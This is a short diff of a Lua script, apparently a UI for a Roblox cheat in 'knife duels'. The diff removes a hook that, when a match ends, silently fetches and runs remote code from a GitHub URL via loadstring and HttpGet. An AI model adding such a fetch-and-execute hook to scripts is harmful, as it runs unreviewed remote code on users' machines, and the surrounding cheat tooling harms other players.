@@ -307,11 +307,5 @@ ThemeManager:ApplyToTab(Tabs.Misc)
 
 Library:SetWatermark("knife duels | closet")
 Library.ToggleKeybind = Enum.KeyCode.RightShift
-MatchController.LocalMatchStateChanged:Connect(function(newState)
-    if newState == nil then
-        task.wait(2)
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/larpsent/incognito/refs/heads/main/incognito.lua"))()
-    end
-end)
 
 print("[knife duels] ui loaded")
